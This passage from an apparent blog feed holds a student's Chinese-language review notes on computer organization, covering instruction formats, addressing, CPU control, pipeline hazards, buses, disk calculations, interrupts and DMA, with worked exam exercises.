1111有4种情况后面加4位可达2<sup>4</sup>*4=64，大于一地址的62条，所以</p><p><strong>1111 1100</strong> 0000 ~ <strong>1111 1100</strong> 1111（16条）<strong>1111 1101</strong> 0000 ~ <strong>1111 1101</strong> 1111（16条）</p><p><strong>1111 1110</strong> 0000 ~ <strong>1111 1110</strong> 1111（16条）<strong>1111 1111</strong> 0000 ~ 1111 1111 1101（14条）</p><p>剩余的1111 1111 1110 ～ 1111 1111 1111可用来扩展零地址指令</p><p>再加4位可表示16位，两种拓展码总共表示32种情况而题目0地址只有30条舍去最后两条即可</p><p>1111 1111 1110 0000 ～ 1111 1111 1110 1111（16条）</p><p>1111 1111 1111 0000 ～ 1111 1111 1111 1101（14条）</p><blockquote><p>拓展码代表这个指令是0地址还是1地址，后面的才代表这种地址码有多少条指令</p><p>多地址指令操作码要最短(存放的地址多)，0地址操作码占满16位，而三地址操作码仅占4位，剩下的12位用来存放三个地址</p></blockquote><p>2.设相对寻址的转移指令占两个字节，第一节是操作码，第二字节是相对位移量（用补码表示），若CPU每当从存储器中取出一个字节时，即自动完成PC+1 -&gt; PC。设当前PC的内容为2009H，要求转移到2000H地址，则该转移指令的第二字节的内容是（F5H）</p><p>答：当前PC为2009H，取指令后变为200BH（要先取指令再执行，取两次所以加2）</p><p>2000H-200BH=-11  (相对寻址都是加偏移量，只有偏移量是负的才能使PC数值减小)</p><p>-11的原码为1000 1011，反码为1111 0100，补码为1111 0101即F5H (题目说了用补码表示)</p><p>3.CISC和RISC的区别</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200611173134098.png"  alt="image-20200611173134098"></p><p>答：由于RISC比较简单，因此大多都是在一个时钟周期内完成。特殊的是RISC寄存器此CISC多，因此更能提高计算机速度。CISC更复杂因此种类啥的都比较多。RISC采用组合逻辑控制CISC才会用到微程序控制(可理解为RISC比较简单用不到那么复杂的微程序控制用逻辑电路即可)</p><p>4.某计算机按字节编址，指令字长固定且只有两种指令格式，其中三地址指令29条，二地址指令107条，每个地址字段为6位，则指令字长至少应该是____________24_________</p><p>答：三地址指令有29条，所以它的操作码至少为5位。2<sup>5</sup>=32，它剩余32-29=3种操作码给二地址。而二地址比三地址少了一个地址的位数多了6位给操作码，因此它数量最大达3*64=192。所以指令字长最少为23位（ 6 + 6 +6 + 5 = 23），因为计算机按字节编址，<strong>需要是8的倍数</strong>，所以指令字长至少应该是24位</p><blockquote><p>同样是24位，3地址时是3个地址位+操作码5位，而2地址时是11位操作码和两个地址位</p></blockquote><p>5.某计算机存储器按字编址(16位)读取这条指令后，PC的值自动加1,则说明该指令的长度是( 2 )个字节</p><p>答：主要看按字节编址还是按字编址。按字寻址可理解为把字编上号然后去找编号。PC加1的目的是自动指向下一条指令的地址即加了一个编号也就是16位，而16位占了2个字节</p><p>6.假设变址寄存器R 的内容为1000H，指令中的形式地址为 2000 H；地址 1000H 中的内容为2000H，地址    2000H 中的内容为 3000H，地址 3000 H 中的内容为 4000H， 则变址寻址方式下访问到的操作数是（ D ）。</p><p>A.1000HB.2000HC.3000HD.4000H</p><p>答：变址寻址中EA=A+®。这里的A即形式地址也就是指令中直接给出的，®表寄存器R的内容。EA=2000H+1000H=3000H，而这个3000H代表的是有效地址，根据地址取值即4000H</p><p>7.某计算机有16个通用寄存器，采用32位定长指令字操作码字段（含寻址方式位）为8位，Store指令的源操作数和目的操作数分别采用寄存器直接寻址和基址寻址方式，若基址寄存器可使用任一通用寄存器，且偏移量用补码表示，则Store指令中偏移量的取值范围是  （ A ）</p><p>A.-32768~+32767B.-32767~+32768C.-65536~+65535D.-65535~+65536</p><p>答：采用32位定长指令字,其中操作码为8位,两个地址码一共占用32-8=24位。</p><p>而Store指令的源操作数和目的操作数分别采用寄存器直接寻址和基址寻址,有 16 个通用寄存器，则寻址一个寄存器需要4 位。</p><p>源操作数中的寄存器直接寻址用掉4位, 而目的操作数采用基址寻址也要指定一个寄存器,同样用掉 4 位,则留给偏移址的位数为24-4-4=16 位。而偏移址用补码表示,16 位补码的表示范围为-32768~+32767</p><blockquote><p>可类比8位补码表示范围是 -128～ +127，注意负数多一位</p></blockquote><p>8.假定编译器将赋值语句“x=x+3;”转换为指令“add xaddr, 3”，其中xaddr是x对应的存储单元地址。若执行该指令的计算机采用页式虚拟存储管理方式，并配有相应的TLB，且Cache使用直写（Write Through）方式，则完成该指令功能需要访问主存的次数至少是（ B ）</p><p>A.0B.1C.2D.3</p><p>答：上述指令的执行过程可分为取数、运算和写回过程，取数时读取xaddr可能不需要访问主存而直接访问Cache，但直写方式也即全写法必须要把数据同时写入Cache和主存，因此至少访问1次。</p><h1 id="zhong-yang-chu-li-qi">中央处理器</h1><h2 id="zhi-shi-dian-4" id="知识点-v5"><a class="header-anchor" href="#知识点-v5">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616172236584.png"  alt="image-20200616172236584"></p><p>1.CPU = 运算器(对数据加工) + 控制器(协调控制各指令序列) + Cache</p><p>2.CPU主要有如下5种功能</p><ul><li><p>指令控制：控制器自动形成指令的地址，并发出取指令的命令，将对应的指令取到控制器中。</p></li><li><p>操作控制：取指令后，产生完成每条指令所需的控制命令</p></li><li><p>时间控制：控制命令产生后，需要对各种控制命令加以时间上的控制</p></li><li><p>数据加工：在执行的过程中，可能需要进行算术运算和逻辑运算</p></li><li><p>中断处理：就是处理中断的能力</p></li></ul><p>3.CPU至少需要六类寄存器，它们分别为</p><ul><li>数据缓冲寄存器(DR)：暂存数据</li><li>指令寄存器(IR)：保存正在执行的一条指令</li><li>程序计数器(PC)：存放第一条指令的地址，每次加一更换成下条指令地址</li><li>数据地址寄存器(AR)：保存当前CPU访问的Cache中单元的地址</li><li>通用寄存器(R<sub>0</sub><sub>R</sub>3~)：存放操作数和各种地址信息（如AX，BX等）</li><li>状态字寄存器(PSW)：保存各种状态条件控制标志，如进位标志、中断标志等</li></ul><p>4.指令周期：CPU取出并执行一条指令的时间，由若干机器周期组成</p><p>机器周期： 完成某个独立操作的时间，由若干时钟周期组成</p><p>时钟周期： 最基本时间单位，由主频决定</p><p>5.指令执行方案：</p><ul><li>单指令周期                  所有指令用相同的执行时间</li><li>多指令周期                  不同类型的指令用不同的步骤完成</li><li><strong>流水线</strong>方案                  指令之间并行执行</li></ul><p>6.CPU主频(时钟频率)对应的是时钟周期，每个机器周期(CPU周期)包含好几个时钟周期</p><p>7.大小顺序为：机器程序=微<strong>程序</strong> &gt; 微<strong>指令</strong> &gt; 微<strong>命令</strong>=微操作</p><p>微<strong>命令</strong>：控制部件向执行部件发出的各种控制命令。而微操作是微命令的执行过程。</p><p>微<strong>指令</strong>：若干微命令的集合</p><p>微<strong>程序</strong>：若干微指令的有序集合，而一条机器指令对应着一个微程序</p><blockquote><p>机器指令由微程序解释执行，微程序由微指令构成，微指令由微命令构成</p></blockquote><p>8.微操作分为相容性和相斥性</p><ul><li>相容性：同一个CPU周期可以并行执行微操作（也叫兼容性）</li><li>相斥性：同一CPU周期不能并行执行微操作</li></ul><p>9.微命令编码</p><ul><li><p>直接控制法：每一位代表一个微命令。</p></li><li><p>直接编码法：相斥的n个微命令可以采用编码法表示，占log<sub>2</sub><sup>(n+1)</sup>位。</p></li><li><p>混合编码法：相斥微命令采用直接编码法，相容微命令采用直接控制法。</p></li></ul><p>10.数据相关分为以下三类，注意读后写(WAR)啥的英文缩写是从后往前读！</p><ul><li><p>RAW(写后读)：应该先写入再读，但现在没写入就读了，出现错误</p></li><li><p>WAR(读后写)：应该先读再写，但现在是写入后再读了，出现错误</p></li><li><p>WAW(写后写)：应该先一个写入另一个再写入，但现在写入的顺序反了，出现错误</p></li></ul><blockquote><p>数据旁路是解决数据相关的一种方法(不用等前一条指令把结果写回寄存器组，结果直接作为输入给下一个指令)</p></blockquote><h2 id="xi-ti-4" id="习题-v5"><a class="header-anchor" href="#习题-v5">¶</a>习题</h2><p>1.XXX对程序员是透明的表示程序员看不见XXX（不可见就是不可改变）<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616192930989.png"  alt="image-20200616192930989"></p><p>2.判断RAW、WAR…<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200617152100918.png"  alt="image-20200617152100918"></p><p>答：:one: 先将结果送到R1，再取出R1参与运算。先写再读即写后读（RAW注意顺序）</p><p>:two: 先读R2再将结果送到R2。先读再写即读后写（WAR）</p><p>:three: 先将第一条指令结果送入R3再将第二条指令结果送到R3，先写后写即写后写</p><p>3.某计算机的控制器采用微程序控制方式，微指令中的操作控制字段采用字段直接编码法，共有33个微命令，构成5个互斥类，分别包含7、3、12、5和6个微命令，则操作控制字段至少有___________________15位___</p><p>答：33个微命令构成5个互斥类，分别包含7、3、12、5和6个微命令，另外每组必须<strong>增加一种不发命令的情况</strong>，则5个段分别需要8、4、13、6和7种状态，分别对应3(2<sup>3</sup>=8)、2、4、3和3位，共15位。</p><p>4.CPU中跟踪指令<strong>后继地址</strong>的寄存器是_______程序计数器______</p><p>5.在微程序控制器中,构成控制信号序列的最小单位是（ B ）</p><p>A.机器指令          B.微命令                       C.微指令                D.微程序</p><p>答：可以看到这几个选项中微命令最小所以选它</p><p>6.在微程序控制器中，执行指令微程序的首条微指令地址是(  D  )得到的。</p><p>A．程序计数器          B．前条微指令          C．μPC          D．指令操作码映射</p><p>答：执行指令微程序的首条微指令地址由指令操作码译码的结果，通过专门的硬件提供。后续地址才会用到程序计数器。</p><p>7.指令流水线有取指(IF)、译码( ID)、执行(EX)、访存(MEM)、写回寄存器堆(WB)五个过程段,共有20条指令连续输人此流水线。</p><p>(1)画出流水处理的时空图，假设时钟周期为100ns。<br>(2)求流水线的实际吞吐率(单位时间里执行完毕的指令数)。<br>(3)求流水线的加速比。</p><p>答：(2)中20条指令花了24个时钟周期的时间直接计算即可（注意时间的单位）</p><p>(3)中的加速比指的是不使用流水线和使用流水线时间的比值也就是所需时钟周期个数之比。</p><blockquote><p>不用流水线就是顺序执行，一个一个来即20*5（一个取值等过程需要一个时钟周期）</p></blockquote><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200622154629411.png"  alt="image-20200622154629411" style="zoom:80%;" /><h1 id="zong-xian-xi-tong">总线系统</h1><h2 id="zhi-shi-dian-5" id="知识点-v6"><a class="header-anchor" href="#知识点-v6">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200617162846524.png"  alt="image-20200617162846524" style="zoom:80%;" /><p>1.总线：是连接多个部件的信息传输线，是各部件共享的传输介质。</p><p>2.总线大致分为三类：</p><ul><li>内部总线：CPU内部各寄存器与运算部件之间的总线</li><li>系统总线：连接其他高速功能部件的总线<ul><li>数据总线：传送各功能部件之间的数据，为双向传输</li><li>地址总线：指定主存和I/O设备接口电路地址，为单向传输</li><li>控制总线：发出各种控制信号</li></ul></li><li>I/O总线：中、低速I/O设备之间互相连接的总线</li></ul><p>3.地址线和数据线复用：地址线和数据线用一条线，一个周期传地址，一个周期传数据</p><p>4.总线宽度：通常指数据总线的根数</p><p>总线带宽：单位时间内总线传输的位数    （可理解为数据传输速率）</p><p>5.总线结构可分为</p><ul><li>单总线结构：将CPU、主存、IO设备连接在一组总线上</li><li>多总线结构：高速、中速、低速设备连接在不同的总线上同时工作，提高效率</li></ul><p>6.CPU-PCI：北桥       PCI-ISA：南桥</p><p>CPU总线：也称CPU-存储器总线</p><p>PCI总线：连接高速的I/O设备</p><p>ISA总线：连接低速I/O设备</p><p>7.串行传送：每次一位传送，不管传多少数据只用一条线</p><p>并行传送：若有32条线，一次就能传送32位，快但是成本高</p><p>8.共享的总线会出现同一时刻多个设备竞争主线控制权，就要从中选择一个</p><ul><li>集中式仲裁 （重点）<ul><li>链式查询：离总线设备越近优先级越高</li><li>计数器查询：地址线的计数值和请求总线的设备地址一致，该设备获得总线控制权</li><li>独立请求：每个设备均有总线请求信号和总线同意信号，根据排队电路判定</li></ul></li><li>分布式仲裁</li></ul><p>9.总线定时指事件出现在总线上的时序</p><ul><li>同步定时：采用统一的时钟信号协调发送和接收方的传送定时关系</li><li>异步定时：同步是在各模块速度一致的情况使用，异步没有公共时钟，采用应答(握手)方式，主模块发请求信号待从模块反馈后开始通信</li></ul><blockquote><p>同步定时比异步定时传输频率高的原因正是其具有统一的公共时钟信号进行同步</p></blockquote><p>10.系统总线标准分为：ISA、EISA、VESA、PCI、PCI-Express（可能出选择题）</p><h2 id="xi-ti-5" id="习题-v6"><a class="header-anchor" href="#习题-v6">¶</a>习题</h2><p>1.假设某系统总线在一个总线周期中并行传输4B信息，一个总线周期占用两个时钟周期，总线时钟频率为10MHz，则总线带宽是(  20MB/s   )。</p><p>答：总线宽度是单位时间内传输的位数，通常用每秒钟传输的字节数表示。4B即4字节。总线时钟周期为1/10MHz=0.1us，由题意得每0.2us可传输4B。那么每秒可以传输4B/0.2us=4B/0.2*10<sup>-6</sup>s=20MB/s</p><p>2.答：CRT是纯平显示器     CPI是一条指令所需时钟周期个数     RAM是随机存储器<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200617182657948.png"  alt="image-20200617182657948"></p><p>3.下列关于多总线结构的叙述中，错误的是 ____<em><strong>D</strong></em></p><p>A.靠近CPU的总线速度较快B.存储器总线可支持突发传送方式</p><p>C.总线之间须通过桥接器相连D.PCI-Express×l6采用并行传输方式</p><p>答：突发传送方式把多个数据单元作为一个独立传输处理，从而最大化设备的吞吐量。一般用支持突发传送方式的总线提高存储器的读写效率。各总线通过桥接器相连，后者起流量交换作用PCI-Express总线都采用串行数据包传输数据</p><p>4.关于提高总线传输率的问题</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200617184609687.png"  alt="image-20200617184609687"></p><p>答：传输率就是每秒传输的数据。增加宽度、提高效率、突发传输(多个单元当做一个传送)都可以提高传输率。地址/数据线复用就是地址和数据线用一个线和每秒传输多少数据没关系。</p><p>5.某同步总线采用数据线和地址线复用方式，其中地址/数据线有32根，总线时钟频率为66MHz，每个时钟周期传送两次数据（上升沿和下降沿各传送一次数据），该总线的最大数据传输率（总线带宽）是 ___<em><strong>C</strong></em></p><p>A.132MB/s       B.264MB/s             C.528MB/s             D.1056MB/s</p><p>答：数据线32根代表一次传输32位即4字节(4B)，66MHz即一秒有66M个时钟周期，而每个周期传两次(上下各一次)，即66M/s×2×4B=528MB/s</p><p>6.下列关于总线设计的叙述中，错误的是 ___<em><strong><strong>A</strong></strong></em></p><p>A.并行总线传输比串行总线传输速度快         B.采用信号线复用技术可减少信号线数量</p><p>C.采用突发传输方式可提高总线数据传输率 D.用分离事务通信方式可提高总线利用率</p><p>答：通常并行一次能传多位数据看着是比串行的速度快，但时钟频率达到一定程度时并行之间的导线会互相影响所以A不是绝对的。</p><p>信号线复用就是线复用不同周期传不一样的信息确实可以减少数量(注意复用)。</p><p>突发传输是一个总线周期可以传输多个存储地址连续的数据也可提高传输率。</p><p>分离事务通信即通过在不传送数据期间释放总线，使得其他申请者能使用总线，以此来提高总线利用率</p><p>7.在集中式总线仲裁中，（B）方式相应时间最快，（A）方式对（C）最敏感</p><p>A.菊花链方式B.独立请求方式C.电路故障D.计数器定时查询</p><p>答：独立请求有请求信号和同意信号最快但也最贵。菊花链(链式)若a<sub>i</sub>位置发生故障则其之后的都不能工作</p><p>8.采用串行接口进行7位ASCII码传送，带有1位奇/偶校验位为1位起始位和1位停止位，当波特率为9600b/s时，字符传送速率为（A）</p><p>A．960 B．873C．1371 D．480</p><p>答：波特率可理解为比特率，即每秒9600比特。7位ASCII和3位起始停止校验共10位，也就是1个字符要占10位。那传输率就等于总比特除1个字符所占比特即9600/10=960</p><h1 id="wai-cun-yu-io-she-bei">外存与IO设备</h1><h2 id="zhi-shi-dian-6" id="知识点-v7"><a class="header-anchor" href="#知识点-v7">¶</a>知识点</h2><p>1.磁道：就是磁盘的一个同心圆，每个磁道又分为多个扇区(磁道的某个弧段)</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200622202745718.png"  alt="image-20200622202745718" style="zoom: 80%;" /><p>2.<strong>道</strong>密度：单位长度有多少个磁<strong>道</strong>数(同心圆)           多少道</p><p>3.<strong>位</strong>密度：单位<strong>磁道</strong>长度能记录的二进制的<strong>位</strong>数      多少位</p><p>4.磁盘容量：面数×每面磁道数×每条磁道的二进制位数</p><p>5.磁盘平均存取时间：T<sub>a</sub>=寻道(找哪一圈)+延迟(找圈中哪个扇区)+传输(读写扇区时间)</p><p>6.数据传输速率：磁盘单位时间向主机传送的字节数（字节/秒）</p><ul><li>D<sub>r</sub>=rN      r为转速即每秒转多少圈(磁道)，N为每个磁道的容量</li><li>D<sub>r</sub>=D*v   D为位密度即单位磁道的位数，v为线速度即每秒能沿着圈走多长</li></ul><p>7.一个磁盘片有两个面，一个磁盘组有很多片(n)，但最上面和最下面的面不能用(即2n-2可用)</p><p>8.显示器刷存带宽=分辨率×每个像素点颜色深度×刷新速率(帧频)</p><h2 id="xi-ti-6" id="习题-v7"><a class="header-anchor" href="#习题-v7">¶</a>习题</h2><p>1.磁盘组有6片磁盘， 每片有两个记录面，最上最下两个面不用。存储区域内径(直径)22cm,外径33cm,道密度为40道/cm，内层位密度400位/cm，转速6000转/分。问:</p><p>(1) 共有多少柱面?<br>(2)盘组总存储容量是多少?<br>(3)数据传输率多少?<br>(4)采用定长数据块记录格式，直接寻址的最小单位是什么?寻址命令中如何表示磁盘地址?<br>(5) 如果某文件长度超过一一个磁道的容量，应将它记录在同一个存储面上，还是记录在同一个柱面上?</p><p>答：(1)：有效存储区域为16.5-11=5.5(cm)，道密度为40道/cm，所以共40*5.5=220道即220个圆柱面（就是一面有多少圈）</p><blockquote><p>要用半径而不是直径因为总圈数用半径算即可，另一半和这一半用的是同一个圈</p></blockquote><p>(2)：内层磁道周长为2πR=2X3.14X11= 69.08(cm)     因为给的是内径密度所以算内径周长<br>每道信息量=400位/cmX 69.08cm=27632 位= 3454B    即一圈信息量  位密度×圈长度<br>每面信息量= 3454BX 220= 759880B     一面一共220圈     道信息×道数<br>盘组总容量= 759880BX10=7 598 800B    6片可用的面为10  面信息×面数</p><p>(3)：磁盘数据传输率D<sub>r</sub>= rN                 N为每条磁道容量，N=3454B<br>r为磁盘转速，r=6000转/60秒=100转/秒   （注意换算单位!!!）<br>D,=rN= 100X 3454B= = 345400B/s         每条磁道容量×磁道数量</p><blockquote><p>注意如果要转换成KB/s，除1024而不是除1000</p></blockquote><p>(4)：最小单位是一个记录块（一个扇区）</p><p>此地址格式表示有4台磁盘，每台有16个记录面，每面有256个磁道，每道有16个扇区</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200610184101789.png"  alt="image-20200610184101789"></p><blockquote><p>台号(一般为2)—&gt;磁道—&gt;面数—&gt;扇区(一般为4)</p></blockquote><p>(5)：如果某文件长度超过一个磁道的容量，应将它记录在同一个柱面上，因为不需要重新找道，数据读/写速度快。</p><blockquote><p>同一柱面同时读的是多个存储面相同位置的那一圈，同一面那就得在不同圈，需要找道也就是找到那一圈的位置。</p></blockquote><p>2.若磁盘转速为7200 转/分，平均寻道时间为 8ms,每个磁道包含 1000 个扇区，则访问一个扇区的平均<strong>存取</strong>时间大约是（ B ）</p><p>A.8.1msB.12.2msC.16.3msD.20.5ms</p><p>答：存取时间=寻道时间+延迟时间+传输时间</p><p>延迟时间等于旋转半圈的时间，1分钟7200圈，那半圈时间为 (60/7200)/2=4.17ms</p><p>传输时间等于转过一个扇区的时间即为(60/7200)/1000=0.01ms</p><p>所以为4.17+0.01+8=12.18ms，保留一位小数则为 12.2ms</p><p>3.假定一台计算机的显示存储器用DRAM芯片实现，若要求显示分辨率为1600×1200，颜色深度为24位，帧频为85Hz，显存总带宽的50%用来刷新屏幕，则需要的显存总带宽至少约为（ D ）</p><p>A.245Mbit/sB.979Mbit/sC.1958Mbit/sD.7834Mbit/s</p><p>答：刷新所需带宽=分辨率×色深×帧频=1600×1200×24bit×85/s=3916.8Mbit/s</p><p>因为显存总带宽的50%用来刷新屏幕，所以显存总带宽为3916.8Mbit/s×2=7834Mbit/s</p><p>4.磁盘的盘面上有很多半径不同的同心圆，这些同心圆称为( B )</p><p>A、扇区B、磁道C、柱面D、磁表面</p><p>答：可以把磁盘想象成一摞蚊香。磁道就是蚊香的一圈，扇区就是蚊香一圈的某个弧段。而柱面相当于在一摞蚊香中间插个柱子那个圆柱就是柱面。读取信息时同时读取一摞蚊香的同一圈(像老式留音机一样)</p><p>5.已知某磁盘存储器转速为2400转/分，每个记录面道数为200道，平均找道时间为60ms,每道存储容量为96Kb，求磁盘的存取时间与数据传输率。</p><p>答：存取时间=平均查找时间+平均等待时间(半圈时间)=60+(60/2400)*1/2*1000=72.5ms</p><p>Dr=96*(2400/60)=3840Kb/s=480KB/s</p><blockquote><p>注意b是位，B是字节，1B=8b</p></blockquote><h1 id="shu-ru-shu-chu-xi-tong">输入输出系统</h1><h2 id="zhi-shi-dian-7" id="知识点-v8"><a class="header-anchor" href="#知识点-v8">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618151509519.png"  alt="image-20200618151509519"></p><p>1.CPU管理外围设备大致有三种方式   下面类比成让10个孩子分别吃两个雪糕的问题</p><ul><li>程序查询方式：先盯着甲吃完一个再给一个然后盯着乙吃完，以此类推</li><li>程序中断方式：每人发一根，谁吃完举手报告再发第二根,等待过程可干其他的事</li><li>直接内存访问(DMA)方式：每人拿两根，都吃完再报告</li></ul><p>2.程序查询方式下，CPU和外围设备之间的传送完全靠计算机程序控制，需要输入输出时，CPU暂停主程序转去执行设备的输入输出服务程序。简单经济但浪费时间。</p><p>DMA方式传送数据，每传送一个数据就要占用一个<strong>存储周期</strong>时间</p><p>DMA方式下DMA控制器从CPU完全接管对总线的控制，数据交换不用经过CPU，直接在内存和I/O设备之间进行。</p><p>3.中断处理过程由硬件和软件完成</p><ul><li>响应中断：有请求就得有响应</li><li>关中断：不再受理其它中断   （要用到状态条件寄存器PSW）</li><li>保存PC：即保存断点，使得中断服务子程序处理完后可以返回原主程序</li><li>保存现场：中断服务子程序修改的寄存器可能会与原寄存器冲突所以先保存 （栈实现）</li><li>设备服务：也就是中断处理程序，该咋处理咋处理</li><li>开中断：表示CPU现在可以受理中断了</li><li>中断返回：先恢复现场(恢复原保存的寄存器和标志位)再恢复断点(返回原主程序)</li></ul><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618154711318.png"  alt="image-20200618154711318" style="zoom:80%;" /><p>从图中我们也可以看出CPU是在结束一个指令周期后检测中断请求信号</p><p>4.中断屏蔽触发器(IM)置0表示CPU可受理外界中断请求，为1表不受理外界中断(1为真即屏蔽)</p><p>单级中断：所有中断源处于同一级，排成一行，离CPU近的优先权高</p><p>多级中断：把中断源分成若干级别，级别高的可以打断级别低的(同级的不行)</p><p>5.中断向量地址是指<strong>中断服务程序入口地址</strong></p><h2 id="xi-ti-7" id="习题-v8"><a class="header-anchor" href="#习题-v8">¶</a>习题</h2><p>1.某机器有 4个中断源，中断响应优先级按1→2→3→4降序排列，若想将中断处理<br>次序改为3→1→4→2，则1、2、3、4中断源对应的屏蔽字分别是为___________________</p><p>答：屏蔽字为1表示真即屏蔽了，就是不能打断它的意思，那为0就是可以打断它</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200618160111614.png"  alt="image-20200618160111614"></p><blockquote><p>主要是看中断处理次序，比如1的屏蔽字，1前面有3，即只有3可以打断它，那么把响应优先级的第三位置为0其他均为1。也可看1后面有4和2，意味着1、4、2不能打断他，即把第1、2、4位置1其他置0即可    （两种思想一个结果）</p><p>以后统一用第一种置0的不容易错</p></blockquote><p>2.屏蔽字问题不要被迷惑，只看响应和处理优先级就行<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618161107440.png"  alt="image-20200618161107440"></p><p>答：本题给了中断屏蔽字格式为M<sub>4</sub>M<sub>3</sub>…，那么屏蔽字的第一位到底代表L<sub>4</sub>还是L<sub>0</sub>呢</p><p>M<sub>4</sub>对应L<sub>4</sub>级别也就是最高级别，而最高级别是L<sub>0</sub>，所以第一位代表的是L<sub>0</sub></p><p>其实这种题只看优先级顺序就行，优先级为L<sub>0</sub><sub>L</sub>4<sub>那么屏蔽字每位对应的也是L</sub>0<sub>～L</sub>4~</p><p>可以打断L1的为L4、L0和L2那么把优先级中这些位置置为0即可</p><p>3.某计算机处理器主频为50MHz,采用定时查询方式控制设备A的I/O,查询程序运行一次所用的时钟周期至少为500。在设备A工作期间，为保证数据不丢失，每秒需对其查询至少200次，则CPU用于设备A的I/O时间占整个CPU时间的百分比至少是（  0.2%  ）</p><p>答：每次查询需要500个周期，每秒要查询200次即需要200*500=10<sup>5</sup>个周期</p><p>而主频为50MHz即每秒有50*10<sup>6</sup>个周期</p><p>那么占比为  10<sup>5</sup>/50*10<sup>6</sup>=1/500=0.002= 0.2%</p><p>4.中断服务程序执行过程<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618164623663.png"  alt="image-20200618164623663"></p><p>答：此题选A。注意本题问的是中断服务程序的顺序也就是知识点中图片的右半部分，而保存断点(区别保存现场)和关中断都是中断隐指令的操作，由硬件完成</p><p>5.I/O总线：主机和I/O设备之前通过这个总线连接</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618183826339.png"  alt="image-20200618183826339"  /><p>答：I/O总线即输入输出总线。肯定就得有指出啥指令的命令字。判断其状态的状态字。而且也得有中断，比如键盘输入引起的中断那肯定也得有中断类型号。</p><p>6.下列选项中，能引起外部中断的事件是（ A ）</p><p>A.键盘输入B.除数为0C.浮点运算下溢D.访存缺页</p><p>答：服务于自己就是内中断，服务于别人就是外中断</p><p>A：键盘输入属于外部事件，CPU要想读取外部的输入就得执行中断暂停主程序转而去读取外部键盘输入</p><p>B：除数为0属于异常，也就是内中断，发生在CPU内部。</p><p>C：浮点运算下溢将按机器零处理，不会产生中断。</p><p>D：访存缺页属于CPU执行指令时产生的中断，也不属于外部中断。</p><blockquote><p>此题只需看外部这两个字就可快速选择键盘，其他仨都是CPU内部的东西</p></blockquote><p>7.中断处理和子程序调用都需要压栈以保护现场，中断处理一定会保存而子程序调用不需 要保存其内容的是____________B_________</p><p>A.程序计数器B.程序状态字寄存器C.通用数据寄存器D.通用地址寄存器</p><p>答：程序计数器即PC二者都需要，因为都要返回原主程序。而程序状态字寄存器(PSW)里面保存中断允许标志位和系统工作状态(如进位标志等)等信息。执行中断隐指令时，需要关中断，保护PC需要PC和PSW。所以子程序调用和PSW无关</p><p>8.中断I/O和DMA的比较</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200618192202277.png"  alt="image-20200618192202277"></p><p>答：中断处理方式：在I/O设备输入每个数据的过程中，由于无需CPU干预，因而可使CPU与I/O设备并行工作。仅当输完一个数据时，才需CPU花费极短的时间去做些中断处理。因此中断申请使用的是CPU处理时间，发生的时间是在一条指令执行结束之后，数据是在软件的控制下完成传送。而DMA方式与之不同。DMA方式：数据传输的基本单位是数据块，即在CPU与I/O设备之间，每次传送至少一个数据块；DMA方式每次申请的是总线的使用权，所传送的数据是从设备直接送入内存的，或者相反；仅在传送一个或多个数据块的开始和结束时，才需CPU干预，整块数据的传送是在控制器的控制下完成的。答案D的说法不正确。</p><p>9.某同步总线的时钟频率为100MHz，宽度为32位，地址/数据线复用，每传输一个地址或数据占用一个时钟周期。若该总线支持突发（猝发）传输方式，则一次“主存写”总线事务传输128位数据所需要的时间至少是（ C ）。</p><p>A.20nsB.40nsC.50nsD.80ns</p><p>答：总线频率为100MHz，则时钟周期为10ns。由于支持突发传送可以连续传送地址连续的数据。传送地址10ns，传送128位数据即4个数据40ns，共需50ns。</p><blockquote><p>平常传送一个数据需要两个时钟周期，先传地址再传数据。突发传输下可将多个连续的数据看成一个数据(不是一周期传完是不用专门一个一个传地址)，也就是先传首地址，之后就可每一个周期传一次数据</p></blockquote><p>10.周期挪用方式常用于___________A___方式的输入/输出中。</p><p>A.DMAB.中断C.程序传送D.通道</p><p>答：周期挪用是指利用CPU不访问存储器的那些周期来实现DMA操作，此时DMA可以使用总线而不用通知CPU也不会妨碍CPU的工作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;为迎接期末，总结了下知识点，供个人复习使用，仅供参考。&lt;/p&gt;
&lt;p&gt;本文用到的复习资料：&lt;a href=&quot;https://pan.baidu.com/s/1s4kU4UtgG7xiUyssDvuwK
      
    
    </summary>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>由快速合并图片引发的思考</title>
